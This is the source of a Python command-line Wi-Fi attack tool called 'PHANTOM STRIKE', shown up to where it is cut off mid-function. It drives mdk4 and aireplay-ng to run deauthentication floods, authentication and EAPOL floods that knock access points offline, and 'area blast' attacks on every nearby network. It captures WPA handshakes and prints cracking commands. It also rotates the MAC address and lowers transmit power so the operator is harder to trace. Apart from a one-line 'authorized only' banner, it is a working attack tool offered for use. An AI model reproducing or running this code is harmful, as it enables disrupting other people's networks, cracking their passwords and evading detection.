#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════╗
║  PHANTOM STRIKE  ·  Advanced 802.11 Warfare Platform             ║
║  JARVIS // RedParadox  ·  Authorized test environments only      ║
╚═══════════════════════════════════════════════════════════════════╝
"""

import os, sys, time, signal, subprocess, threading, re, csv, json, random, struct
from datetime import datetime
from pathlib import Path
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich.live import Live
from rich.layout import Layout
from rich.text import Text
from rich.align import Align
from rich import box
from rich.prompt import Prompt, Confirm
from rich.columns import Columns
from rich.rule import Rule
from rich.style import Style

# ── Root check ────────────────────────────────────────────────────────────────
if os.geteuid() != 0:
    print("\033[91m[!] PHANTOM STRIKE requires root. Run: sudo python3 phantom-strike.py\033[0m")
    sys.exit(1)

console = Console()

# ── Globals ───────────────────────────────────────────────────────────────────
active_procs: list[subprocess.Popen] = []
monitor_iface = ""
original_iface = ""
original_mac   = ""
current_mac    = ""
SESSION_LOG = Path("/home/core/phantom-wifi/strike.log")
CAPTURE_DIR = Path("/home/core/phantom-wifi/captures")
SESSION_LOG.parent.mkdir(parents=True, exist_ok=True)
CAPTURE_DIR.mkdir(parents=True, exist_ok=True)

# ── Stealth config (set at runtime) ──────────────────────────────────────────
stealth = {
    "enabled":      False,
    "rotate_mac":   True,
    "rotate_secs":  30,
    "reduce_power": True,
    "power_dbm":    5,
    "ghost_mode":   True,
}

# ── Signal / cleanup ──────────────────────────────────────────────────────────
def cleanup(sig=None, frame=None):
    console.print()
    console.rule("[bold red]PHANTOM STRIKE — SESSION TERMINATED[/]")
    stop_mac_rotation()
    _kill_all()
    if monitor_iface:
        console.print(f"[dim]Restoring {original_iface} to managed mode...[/]")
        subprocess.run(["airmon-ng", "stop", monitor_iface], capture_output=True)
        subprocess.run(["systemctl", "start", "wpa_supplicant"], capture_output=True)
        # Restore real MAC on original interface
        if original_mac:
            time.sleep(1)
            subprocess.run(["ip","link","set",original_iface,"address",original_mac],
                           capture_output=True)
        console.print(f"[green]✓ Interface restored  ·  MAC: {original_mac}[/]")
    console.print("[bold red]Session ended.[/]\n")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def _kill_all():
    for p in active_procs:
        try:
            p.terminate(); p.wait(timeout=2)
        except Exception:
            try: p.kill()
            except: pass
    active_procs.clear()

def _log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(SESSION_LOG, "a") as f:
        f.write(f"[{ts}] {msg}\n")

# ── MAC spoofing ──────────────────────────────────────────────────────────────

def _get_real_mac(iface: str) -> str:
    """Read the real hardware MAC before any spoofing."""
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip()
    except Exception:
        r = subprocess.run(["ip","link","show", iface], capture_output=True, text=True)
        m = re.search(r"link/ether ([0-9a-f:]{17})", r.stdout)
        return m.group(1) if m else "00:00:00:00:00:00"

def _random_mac() -> str:
    """
    Generate a random locally administered, unicast MAC.
    Bit 1 of first octet = 1 (locally administered)
    Bit 0 of first octet = 0 (unicast)
    Common vendor prefixes randomized to avoid obvious spoofing signatures.
    """
    # Use real-looking OUIs to avoid trivial detection
    ouis = [
        "00:1A:2B", "00:50:56", "08:00:27", "52:54:00",
        "B8:27:EB", "DC:A6:32", "E4:5F:01", "F0:18:98",
        "28:CD:C1", "A4:C3:F0", "3C:22:FB", "70:85:C2",
    ]
    oui = random.choice(ouis)
    suffix = ":".join(f"{random.randint(0,255):02X}" for _ in range(3))
    return f"{oui}:{suffix}"

def mac_spoof(iface: str, mac: str = None) -> str:
    """Spoof MAC on interface. Returns the new MAC."""
    global current_mac
    new_mac = mac or _random_mac()
    subprocess.run(["ip","link","set", iface,"down"], capture_output=True)
    subprocess.run(["ip","link","set", iface,"address", new_mac], capture_output=True)
    subprocess.run(["ip","link","set", iface,"up"], capture_output=True)
    time.sleep(0.3)
    current_mac = new_mac
    _log(f"MAC spoofed: {iface} → {new_mac}")
    return new_mac

def mac_restore(iface: str):
    """Restore original hardware MAC."""
    global current_mac
    if original_mac:
        subprocess.run(["ip","link","set", iface,"down"], capture_output=True)
        subprocess.run(["ip","link","set", iface,"address", original_mac], capture_output=True)
        subprocess.run(["ip","link","set", iface,"up"], capture_output=True)
        current_mac = original_mac
        _log(f"MAC restored: {iface} → {original_mac}")

def set_tx_power(iface: str, dbm: int):
    """Reduce TX power to limit detection range."""
    subprocess.run(["iw","dev", iface,"set","txpower","fixed", str(dbm * 100)],
                   capture_output=True)
    _log(f"TX power set: {iface} → {dbm} dBm")

# ── MAC rotation thread ───────────────────────────────────────────────────────

_rotation_stop = threading.Event()

def _mac_rotation_worker(iface: str, interval: int, status_cb=None):
    """Background thread: rotate MAC every interval seconds."""
    while not _rotation_stop.wait(interval):
        new = mac_spoof(iface)
        if status_cb:
            status_cb(new)

def start_mac_rotation(iface: str, interval: int = 30, status_cb=None):
    _rotation_stop.clear()
    t = threading.Thread(target=_mac_rotation_worker, args=(iface, interval, status_cb),
                         daemon=True)
    t.start()
    return t

def stop_mac_rotation():
    _rotation_stop.set()

# ── Banner ────────────────────────────────────────────────────────────────────
BANNER = """
[bold red] ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗[/]
[bold red]██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║[/]
[bold red]██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║[/]
[bold red]██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║[/]
[bold red]██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║[/]
[bold red]╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝[/]

[bold white]  ███████╗████████╗██████╗ ██╗██╗  ██╗███████╗[/]
[bold white]  ██╔════╝╚══██╔══╝██╔══██╗██║██║ ██╔╝██╔════╝[/]
[bold white]  ███████╗   ██║   ██████╔╝██║█████╔╝ █████╗[/]
[bold white]  ╚════██║   ██║   ██╔══██╗██║██╔═██╗ ██╔══╝[/]
[bold white]  ███████║   ██║   ██║  ██║██║██║  ██╗███████╗[/]
[bold white]  ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝[/]
"""

def show_banner():
    console.clear()
    console.print(Align.center(BANNER))
    console.print(Align.center(
        "[dim]Advanced 802.11 Warfare Platform  ·  JARVIS // RedParadox[/]\n"
        "[dim red]Authorized test environments only[/]"
    ))
    console.print()

# ── Interface selector ────────────────────────────────────────────────────────
def get_interfaces() -> list[str]:
    r = subprocess.run(["iwconfig"], capture_output=True, text=True)
    return re.findall(r"^(\w+)\s+IEEE", r.stdout, re.MULTILINE)

def select_interface() -> str:
    ifaces = get_interfaces()
    tbl = Table(title="[bold]Wireless Interfaces[/]", box=box.SIMPLE_HEAVY,
                border_style="red", title_style="bold white")
    tbl.add_column("#", style="bold red", width=4)
    tbl.add_column("Interface", style="bold cyan")
    tbl.add_column("Details", style="dim")

    for i, iface in enumerate(ifaces):
        r = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
        mode = re.search(r"Mode:(\S+)", r.stdout)
        tx   = re.search(r"Tx-Power=(\S+)", r.stdout)
        tbl.add_row(
            str(i+1),
            iface,
            f"Mode:{mode.group(1) if mode else '?'}  Tx:{tx.group(1) if tx else '?'}"
        )

    console.print(tbl)
    while True:
        choice = Prompt.ask("[bold yellow]Select interface", default="1")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(ifaces):
                return ifaces[idx]
        except ValueError:
            pass

def enable_monitor(iface: str) -> str:
    global monitor_iface, original_iface, original_mac, current_mac
    original_iface = iface
    original_mac   = _get_real_mac(iface)
    current_mac    = original_mac

    with console.status(f"[bold yellow]Preparing {iface} for monitor mode...", spinner="dots"):
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
        subprocess.run(["airmon-ng", "start", iface], capture_output=True)
        time.sleep(1)

    mon = iface + "mon"
    r = subprocess.run(["iwconfig"], capture_output=True, text=True)
    if mon not in r.stdout:
        mon = iface
        subprocess.run(["ip","link","set",iface,"down"], capture_output=True)
        subprocess.run(["iw", iface, "set","monitor","none"], capture_output=True)
        subprocess.run(["ip","link","set",iface,"up"], capture_output=True)

    monitor_iface = mon
    console.print(f"[bold green]✓ Monitor mode active:[/] [bold cyan]{mon}[/]")
    console.print(f"[dim]  Real MAC: {original_mac}[/]\n")
    _log(f"Monitor enabled: {mon} | real MAC: {original_mac}")
    return mon

# ── AP Scanner ────────────────────────────────────────────────────────────────
def scan_aps(mon: str, duration: int = 20) -> list[dict]:
    prefix = "/tmp/ps_scan"
    for f in Path("/tmp").glob("ps_scan*"):
        f.unlink(missing_ok=True)

    p = subprocess.Popen(
        ["airodump-ng", mon, "--output-format", "csv", "-w", prefix, "--write-interval", "3"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

    with Progress(
        SpinnerColumn(spinner_name="dots", style="bold red"),
        TextColumn("[bold white]Scanning airspace..."),
        BarColumn(bar_width=40, style="red", complete_style="bright_red"),
        TextColumn("[bold yellow]{task.percentage:.0f}%"),
        TimeElapsedColumn(),
        console=console,
    ) as prog:
        task = prog.add_task("", total=duration)
        for _ in range(duration):
            time.sleep(1)
            prog.advance(task)

    p.terminate(); p.wait()

    aps = []
    csv_f = Path(f"{prefix}-01.csv")
    if not csv_f.exists():
        return aps

    with open(csv_f, "r", errors="ignore") as f:
        in_ap = True
        for row in csv.reader(f):
            if not row: in_ap = False; continue
            if "BSSID" in str(row[0]): continue
            if in_ap and len(row) >= 14:
                bssid = row[0].strip()
                if not re.match(r"^[0-9A-Fa-f:]{17}$", bssid): continue
                try:   pwr = int(row[8].strip())
                except: pwr = -99
                aps.append({
                    "bssid":    bssid,
                    "ssid":     row[13].strip() or "<hidden>",
                    "ch":       row[3].strip(),
                    "pwr":      pwr,
                    "enc":      row[5].strip(),
                    "beacons":  row[9].strip(),
                    "data":     row[10].strip(),
                    "clients":  0,
                })

    aps.sort(key=lambda x: x["pwr"], reverse=True)
    return aps

def render_ap_table(aps: list[dict], title: str = "Detected Access Points",
                    selected: list[int] = None) -> Table:
    tbl = Table(
        title=f"[bold white]{title}[/]",
        box=box.HEAVY_EDGE,
        border_style="red",
        title_style="bold white on red",
        header_style="bold red",
        show_lines=False,
    )
    tbl.add_column("#",       style="bold white", width=4,  justify="right")
    tbl.add_column("BSSID",   style="bold cyan",  width=19)
    tbl.add_column("SSID",    style="bold white", width=24, no_wrap=True)
    tbl.add_column("CH",      style="yellow",     width=4,  justify="right")
    tbl.add_column("PWR",     width=6,  justify="right")
    tbl.add_column("ENC",     width=10)
    tbl.add_column("DATA",    style="dim", width=6, justify="right")

    for i, ap in enumerate(aps):
        num     = str(i + 1)
        pwr     = ap["pwr"]
        pwr_col = "bright_green" if pwr > -50 else "yellow" if pwr > -70 else "red"
        enc     = ap["enc"]
        enc_col = "bright_red bold" if enc == "OPN" else "green"
        ssid    = ap["ssid"][:23]

        row_style = "on grey15" if selected and i in selected else ""

        tbl.add_row(
            f"[bold red]{num}[/]" if not selected else
            f"[bold green]►{num}[/]" if selected and i in selected else f"[dim]{num}[/]",
            f"[bold cyan]{ap['bssid']}[/]",
            f"[bold white]{ssid}[/]",
            ap["ch"],
            f"[{pwr_col}]{pwr}[/]",
            f"[{enc_col}]{enc}[/]",
            ap["data"],
            style=row_style,
        )

    return tbl

# ── Attack engines ────────────────────────────────────────────────────────────

def _start(cmd: list[str]) -> subprocess.Popen:
    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    active_procs.append(p)
    return p

def _set_channel(iface: str, ch):
    try:
        subprocess.run(["iw","dev",iface,"set","channel",str(ch)], capture_output=True)
    except: pass

def attack_deauth(mon: str, bssid: str, ch: int, client: str = "FF:FF:FF:FF:FF:FF"):
    """Dual-stream deauth: mdk4 + aireplay-ng"""
    _set_channel(mon, ch)
    _start(["mdk4", mon, "d", "-B", bssid, "-c", str(ch)])
    _start(["aireplay-ng", "--deauth", "0", "-a", bssid, "-c", client, mon])

def attack_auth_dos(mon: str, bssid: str, ch: int):
    """Auth request flood — freezes AP"""
    _set_channel(mon, ch)
    _start(["mdk4", mon, "a", "-a", bssid, "-m"])

def attack_eapol(mon: str, bssid: str, ch: int):
    """EAPOL session flood — blocks new connections"""
    _set_channel(mon, ch)
    _start(["mdk4", mon, "e", "-t", bssid])

def attack_beacon(mon: str, ssids: list[str] = None, ch: int = None):
    """Beacon flood with IDS ghost mode"""
    cmd = ["mdk4", mon, "b"]
    if ssids:
        sf = "/tmp/ps_beacons.txt"
        with open(sf, "w") as f:
            f.write("\n".join(ssids))
        cmd += ["-f", sf]
    if ch: cmd += ["-c", str(ch)]
    cmd += ["--ghost", "80,54,5"]
    _start(cmd)

def attack_wids(mon: str, bssid: str):
    """WIDS/IDS confusion"""
    _start(["mdk4", mon, "w", "-e", bssid])

def attack_full_spectrum(mon: str, bssid: str, ch: int):
    """4-stream simultaneous saturation"""
    _set_channel(mon, ch)
    _start(["mdk4",      mon, "d", "-B", bssid, "-c", str(ch)])
    _start(["aireplay-ng","--deauth","0","-a",bssid, mon])
    _start(["mdk4",      mon, "a", "-a", bssid, "-m"])
    _start(["mdk4",      mon, "e", "-t", bssid])

def capture_handshake(mon: str, bssid: str, ssid: str, ch: int) -> str:
    """Capture WPA handshake"""
    _kill_all()
    _set_channel(mon, ch)
    fname = f"{CAPTURE_DIR}/{ssid.replace(' ','_')}_{datetime.now():%H%M%S}"

    cap = subprocess.Popen(
        ["airodump-ng", "-c", str(ch), "--bssid", bssid,
         "-w", fname, "--output-format", "cap", mon],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    active_procs.append(cap)
    return fname + "-01.cap"

# ── Stealth arm — call before any attack ─────────────────────────────────────

def _stealth_arm(mon: str):
    """Apply stealth settings before attack launch."""
    if not stealth["enabled"]:
        return
    # Initial MAC spoof
    new_mac = mac_spoof(mon)
    console.print(f"[bold magenta]  ◈ MAC spoofed  →  {new_mac}[/]")
    # Reduce TX power
    if stealth["reduce_power"]:
        set_tx_power(mon, stealth["power_dbm"])
        console.print(f"[bold magenta]  ◈ TX power  →  {stealth['power_dbm']} dBm[/]")

def _stealth_disarm(mon: str):
    """Stop rotation and restore TX after attack."""
    stop_mac_rotation()
    if stealth["enabled"] and stealth["reduce_power"]:
        subprocess.run(["iw","dev", mon,"set","txpower","auto"], capture_output=True)

# ── Status live panel ─────────────────────────────────────────────────────────

def live_attack_panel(target: dict, mode_name: str, stream_count: int):
    """Show live attack status until Ctrl+C"""
    start   = time.time()
    mac_log = [current_mac]  # track MAC changes for display

    # Start MAC rotation if stealth enabled
    rotation_thread = None
    if stealth["enabled"] and stealth["rotate_mac"]:
        def _on_rotate(new_mac):
            mac_log.append(new_mac)
        rotation_thread = start_mac_rotation(
            monitor_iface, stealth["rotate_secs"], status_cb=_on_rotate
        )

    def make_panel():
        elapsed = int(time.time() - start)
        alive   = sum(1 for p in active_procs if p.poll() is None)
        bars    = "█" * min(alive * 8, 40)
        h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
        rotations = len(mac_log) - 1

        txt = Text()
        txt.append(f"\n  TARGET  ", style="bold red")
        txt.append(f"{target['ssid']}\n", style="bold white")
        txt.append(f"  BSSID   ", style="bold red")
        txt.append(f"{target['bssid']}\n", style="cyan")
        txt.append(f"  CHANNEL ", style="bold red")
        txt.append(f"{target['ch']}\n", style="yellow")
        txt.append(f"  MODE    ", style="bold red")
        txt.append(f"{mode_name}\n\n", style="bold magenta")
        txt.append(f"  STREAMS ", style="bold red")
        txt.append(f"{alive}/{stream_count}  ", style="bold green")
        txt.append(f"[{bars:<40}]\n", style="red")
        txt.append(f"  ELAPSED ", style="bold red")
        txt.append(f"{h:02d}:{m:02d}:{s:02d}\n", style="dim white")

        # Stealth status block
        if stealth["enabled"]:
            txt.append(f"\n  ── STEALTH ────────────────────────────────\n", style="dim magenta")
            txt.append(f"  IDENTITY ", style="bold magenta")
            txt.append(f"{mac_log[-1]}\n", style="magenta")
            txt.append(f"  ROTATIONS", style="bold magenta")
            txt.append(f" {rotations}x ", style="bold green")
            if stealth["rotate_mac"]:
                next_in = stealth["rotate_secs"] - (elapsed % stealth["rotate_secs"])
                txt.append(f"(next in {next_in}s)\n", style="dim")
            txt.append(f"  TX POWER ", style="bold magenta")
            txt.append(f"{stealth['power_dbm']} dBm  " if stealth["reduce_power"]
                       else "full\n", style="yellow")
            txt.append(f"  GHOST    ", style="bold magenta")
            txt.append(f"{'ACTIVE' if stealth['ghost_mode'] else 'OFF'}\n", style="green")
        else:
            txt.append(f"\n  [dim]STEALTH: OFF — MAC visible to WIDS[/]\n")

        txt.append(f"\n  Ctrl+C to stop\n", style="dim")
        title = "[bold red]◈ ATTACK ACTIVE[/]" if not stealth["enabled"] else \
                "[bold magenta]◈ PHANTOM STRIKE — STEALTH ACTIVE[/]"
        return Panel(txt, title=title,
                     border_style="magenta" if stealth["enabled"] else "red",
                     box=box.HEAVY)

    with Live(make_panel(), refresh_per_second=2, console=console) as live:
        try:
            while True:
                live.update(make_panel())
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass

    stop_mac_rotation()
    _kill_all()
    _stealth_disarm(monitor_iface)

# ── MODE A: TARGETED STRIKE (wifite-style) ────────────────────────────────────

def mode_targeted(mon: str):
    console.rule("[bold red]◈ TARGETED STRIKE MODE[/]")
    console.print("[dim]Scan → Select → Auto-attack sequence[/]\n")

    while True:
        aps = scan_aps(mon, 20)
        if not aps:
            console.print("[red]No APs found. Retrying...[/]")
            continue

        console.print(render_ap_table(aps))

        choice = Prompt.ask(
            "[bold yellow]Select target[/] [dim](number, or R to rescan)[/]",
            default="R"
        )
        if choice.upper() == "R":
            continue
        try:
            idx = int(choice) - 1
            if not (0 <= idx < len(aps)):
                raise ValueError()
        except ValueError:
            console.print("[red]Invalid.[/]")
            continue

        target = aps[idx]
        try:
            ch = int(target["ch"])
        except:
            ch = 6
        break

    # Show target card
    console.print(Panel(
        f"[bold red]BSSID[/]    [cyan]{target['bssid']}[/]\n"
        f"[bold red]SSID[/]     [bold white]{target['ssid']}[/]\n"
        f"[bold red]Channel[/]  [yellow]{ch}[/]\n"
        f"[bold red]Signal[/]   [green]{target['pwr']} dBm[/]\n"
        f"[bold red]Security[/] [magenta]{target['enc']}[/]",
        title="[bold white on red]  TARGET LOCKED  [/]",
        border_style="red", box=box.DOUBLE_EDGE
    ))

    # Attack menu
    attacks = [
        ("1", "DEAUTH FLOOD",    "Dual-stream client disconnection (mdk4 + aireplay-ng)",  "red"),
        ("2", "AUTH DoS",        "Fake auth flood — freezes/crashes AP",                   "yellow"),
        ("3", "EAPOL FLOOD",     "Session table fill — blocks all new connections",         "blue"),
        ("4", "WIDS CONFUSION",  "Cross-link WDS nodes — overwhelms IDS/IPS",              "cyan"),
        ("5", "FULL SPECTRUM",   "All 4 streams simultaneously — maximum saturation",       "bold red"),
        ("6", "HANDSHAKE GRAB",  "Force deauth → capture WPA handshake for cracking",      "green"),
        ("7", "CUSTOM CLIENT",   "Deauth a specific client MAC only",                      "magenta"),
    ]

    tbl = Table(box=box.SIMPLE, border_style="red", show_header=False)
    tbl.add_column("Key", style="bold red", width=4)
    tbl.add_column("Mode", style="bold white", width=20)
    tbl.add_column("Description", style="dim")
    for key, name, desc, col in attacks:
        tbl.add_row(f"[{col}]{key}[/]", f"[{col}]{name}[/]", desc)

    console.print(tbl)
    mode = Prompt.ask("[bold yellow]Select attack", choices=["1","2","3","4","5","6","7","0"],
                      default="5")

    if mode == "0":
        return

    _kill_all()
    _log(f"TARGETED: {target['ssid']} ({target['bssid']}) mode={mode} stealth={stealth['enabled']}")

    # Arm stealth before any attack
    _stealth_arm(mon)
    console.print()

    if mode == "1":
        attack_deauth(mon, target["bssid"], ch)
        live_attack_panel(target, "DEAUTH FLOOD", 2)
    elif mode == "2":
        attack_auth_dos(mon, target["bssid"], ch)
        live_attack_panel(target, "AUTH DoS", 1)
    elif mode == "3":
        attack_eapol(mon, target["bssid"], ch)
        live_attack_panel(target, "EAPOL FLOOD", 1)
    elif mode == "4":
        attack_wids(mon, target["bssid"])
        live_attack_panel(target, "WIDS CONFUSION", 1)
    elif mode == "5":
        console.print(f"\n[bold red]FULL SPECTRUM — 4 attack streams launching...[/]")
        attack_full_spectrum(mon, target["bssid"], ch)
        live_attack_panel(target, "FULL SPECTRUM ×4", 4)
    elif mode == "6":
        cap_file = capture_handshake(mon, target["bssid"], target["ssid"], ch)
        console.print(f"\n[bold yellow]Capturing on CH{ch}. Deauth bursts will force clients to reconnect...[/]")
        with Progress(SpinnerColumn(), TextColumn("[bold cyan]Waiting for handshake..."),
                      TimeElapsedColumn(), console=console) as prog:
            t = prog.add_task("", total=None)
            for burst in range(8):
                time.sleep(5)
                # Rotate MAC between bursts if stealth enabled
                if stealth["enabled"] and stealth["rotate_mac"]:
                    new_mac = mac_spoof(mon)
                subprocess.run(["aireplay-ng","--deauth","15","-a",target["bssid"],mon],
                               capture_output=True)
                prog.advance(t)
        _kill_all()
        console.print(Panel(
            f"[bold green]Capture complete[/]\n"
            f"[dim]File:[/] [cyan]{cap_file}[/]\n\n"
            f"[dim]Crack with aircrack-ng:[/]\n"
            f"[bold white]aircrack-ng {cap_file} -w /home/core/phantom-wifi/rockyou.txt[/]\n"
            f"[dim]Or hashcat (mode 22000):[/]\n"
            f"[bold white]hcxpcapngtool -o hash.hc22000 {cap_file}[/]",
            title="[bold green]HANDSHAKE CAPTURED[/]", border_style="green"
        ))
    elif mode == "7":
        client = Prompt.ask("[bold yellow]Target client MAC")
        if re.match(r"^[0-9A-Fa-f:]{17}$", client):
            attack_deauth(mon, target["bssid"], ch, client)
            live_attack_panel(target, f"TARGETED DEAUTH → {client[:8]}...", 2)


# ── MODE B: AREA BLAST — multi-target simultaneous ───────────────────────────

def mode_area_blast(mon: str):
    console.rule("[bold red]◈ AREA BLAST MODE[/]")
    console.print("[dim]Scan → Select multiple targets → Simultaneous saturation[/]\n")

    aps = scan_aps(mon, 25)
    if not aps:
        console.print("[red]No APs found.[/]")
        return

    console.print(render_ap_table(aps, "Select Targets for Area Blast"))

    console.print(
        "\n[bold yellow]Enter target numbers[/] [dim](comma-separated, or A for all, or range 1-5)[/]"
    )
    raw = Prompt.ask("[bold yellow]Targets", default="A")

    if raw.strip().upper() == "A":
        targets = aps
        selected_idx = list(range(len(aps)))
    else:
        selected_idx = []
        for part in raw.split(","):
            part = part.strip()
            m = re.match(r"^(\d+)-(\d+)$", part)
            if m:
                selected_idx += list(range(int(m.group(1))-1, int(m.group(2))))
            elif part.isdigit():
                selected_idx.append(int(part)-1)
        selected_idx = [i for i in selected_idx if 0 <= i < len(aps)]
        targets = [aps[i] for i in selected_idx]

    if not targets:
        console.print("[red]No valid targets.[/]")
        return

    # Show selection
    console.print(render_ap_table(aps, f"AREA BLAST — {len(targets)} targets", selected_idx))

    attack_choices = {
        "1": ("DEAUTH",   "Deauth flood on all targets"),
        "2": ("FULL",     "Full spectrum on all targets (4 streams each)"),
        "3": ("AUTH",     "Auth DoS on all targets"),
        "4": ("EAPOL",    "EAPOL flood on all targets"),
        "5": ("ROTATING", "Rotate between targets every 30s"),
    }
    tbl = Table(box=box.SIMPLE, show_header=False, border_style="red")
    tbl.add_column("Key", style="bold red", width=4)
    tbl.add_column("Mode", style="bold white", width=15)
    tbl.add_column("", style="dim")
    for k, (n, d) in attack_choices.items():
        tbl.add_row(k, n, d)
    console.print(tbl)

    mode = Prompt.ask("[bold yellow]Select mode", choices=list(attack_choices.keys()), default="1")

    if not Confirm.ask(f"\n[bold red]Launch {attack_choices[mode][0]} on {len(targets)} target(s)?[/]"):
        return

    _log(f"AREA BLAST: {len(targets)} targets mode={mode} stealth={stealth['enabled']}")

    # Arm stealth
    _stealth_arm(mon)
    console.print()

    # Launch
    if mode == "5":
        # Rotating mode
        _rotating_attack(mon, targets)
        return

    streams_per = 4 if mode == "2" else 1
    total_streams = len(targets) * streams_per

    for ap in targets:
        try:  ch = int(ap["ch"])
        except: ch = 6
        if mode == "1":   attack_deauth(mon, ap["bssid"], ch)
        elif mode == "2": attack_full_spectrum(mon, ap["bssid"], ch)
        elif mode == "3": attack_auth_dos(mon, ap["bssid"], ch)
        elif mode == "4": attack_eapol(mon, ap["bssid"], ch)

    # Live area blast panel
    start = time.time()
    def make_area_panel():
        elapsed = int(time.time() - start)
        alive   = sum(1 for p in active_procs if p.poll() is None)
        h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60

        tbl = Table(box=box.SIMPLE, show_header=False, padding=(0,1))
        tbl.add_column("", style="bold red", width=3)
        tbl.add_column("SSID", style="bold white", width=22)
        tbl.add_column("BSSID", style="cyan", width=18)
        tbl.add_column("CH", style="yellow", width=3)
        tbl.add_column("Status", width=12)

        for ap in targets:
            tbl.add_row("◈", ap["ssid"][:21], ap["bssid"], ap["ch"],
                        "[bold red]ACTIVE[/]")

        txt = Text()
        txt.append(f"\n  MODE     ", style="bold red")
        txt.append(f"{attack_choices[mode][0]}\n", style="bold magenta")
        txt.append(f"  TARGETS  ", style="bold red")
        txt.append(f"{len(targets)}\n", style="bold white")
        txt.append(f"  STREAMS  ", style="bold red")
        txt.append(f"{alive}/{total_streams}\n", style="bold green")
        txt.append(f"  ELAPSED  ", style="bold red")
        txt.append(f"{h:02d}:{m:02d}:{s:02d}\n\n", style="dim")
        txt.append("  Ctrl+C to abort\n", style="dim red")

        return Panel(
            Columns([txt, tbl]),
            title=f"[bold white on red]  ◈ AREA BLAST — {len(targets)} TARGETS  [/]",
            border_style="red", box=box.DOUBLE_EDGE
        )

    with Live(make_area_panel(), refresh_per_second=2, console=console) as live:
        try:
            while True:
                live.update(make_area_panel())
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass

    _kill_all()
    console.print(f"\n[bold green]Area blast ended.[/] {len(targets)} targets processed.\n")


def _rotating_attack(mon: str, targets: list[dict], interval: int = 30):
    """Rotate attack focus across all targets every N seconds"""
    console.print(f"[bold cyan]Rotating attack — {interval}s per target[/]")

    start = time.time()
    target_idx = 0

    def make_panel(current):
        elapsed = int(time.time() - start)
        remaining = interval - (elapsed % interval)
        txt = Text()
        txt.append(f"\n  CURRENT  ", style="bold red")
        txt.append(f"{current['ssid']}\n", style="bold white")
        txt.append(f"  BSSID    ", style="bold red")
        txt.append(f"{current['bssid']}\n", style="cyan")
        txt.append(f"  NEXT IN  ", style="bold red")
        txt.append(f"{remaining}s\n", style="yellow")
        txt.append(f"  ELAPSED  ", style="bold red")
        txt.append(f"{elapsed}s\n\n", style="dim")
        txt.append("  Ctrl+C to stop\n", style="dim red")
        return Panel(txt, title="[bold red]◈ ROTATING STRIKE[/]",
                     border_style="red", box=box.HEAVY)

    with Live(make_panel(targets[0]), refresh_per_second=2, console=console) as live:
        try:
            while True:
                current = targets[target_idx % len(targets)]
                _kill_all()
                try: ch = int(current["ch"])
                except: ch = 6
                attack_full_spectrum(mon, current["bssid"], ch)

                for _ in range(interval * 2):
                    live.update(make_panel(current))
                    time.sleep(0.5)

                target_idx += 1
        except KeyboardInterrupt:
            pass

    _kill_all()

# ── Stealth configuration screen ─────────────────────────────────────────────

def stealth_config_screen():
    console.rule("[bold magenta]◈ STEALTH CONFIGURATION[/]")
    console.print(
        "[dim]Configure identity masking before attacks. "
        "All settings apply globally until changed.[/]\n"
    )

    def _status():
        on  = "[bold green]ON[/]"
        off = "[bold red]OFF[/]"
        tbl = Table(box=box.SIMPLE_HEAVY, border_style="magenta", show_header=False)
        tbl.add_column("Setting", style="bold white", width=22)
        tbl.add_column("Value",   width=24)
        tbl.add_column("Info",    style="dim", width=36)
        tbl.add_row("STEALTH MODE",
                    on if stealth["enabled"] else off,
                    "Master toggle — arms all below")
        tbl.add_row("MAC SPOOFING",
                    on if stealth["rotate_mac"] else off,
                    "Randomize MAC before each attack")
        tbl.add_row("MAC ROTATION INTERVAL",
                    f"[yellow]{stealth['rotate_secs']}s[/]",
                    "Change identity every N seconds")
        tbl.add_row("REDUCE TX POWER",
                    on if stealth["reduce_power"] else off,
                    "Limit physical detection range")
        tbl.add_row("TX POWER",
                    f"[yellow]{stealth['power_dbm']} dBm[/]",
                    "Lower = shorter range = harder to trace")
        tbl.add_row("GHOST MODE (mdk4)",
                    on if stealth["ghost_mode"] else off,
                    "Randomize frame rate/power in mdk4")
        console.print(tbl)

    while True:
        _status()
        console.print(
            f"\n  [bold magenta]1[/]  Toggle stealth master\n"
            f"  [bold magenta]2[/]  Toggle MAC rotation\n"
            f"  [bold magenta]3[/]  Set rotation interval (current: {stealth['rotate_secs']}s)\n"
            f"  [bold magenta]4[/]  Toggle TX power reduction\n"
            f"  [bold magenta]5[/]  Set TX power dBm (current: {stealth['power_dbm']})\n"
            f"  [bold magenta]6[/]  Toggle ghost mode\n"
            f"  [bold magenta]0[/]  Back\n"
        )
        c = Prompt.ask("[bold magenta]Option", choices=["0","1","2","3","4","5","6"], default="0")
        if c == "0":
            break
        elif c == "1":
            stealth["enabled"] = not stealth["enabled"]
            console.print(f"[bold magenta]Stealth master: {'ON' if stealth['enabled'] else 'OFF'}[/]")
        elif c == "2":
            stealth["rotate_mac"] = not stealth["rotate_mac"]
        elif c == "3":
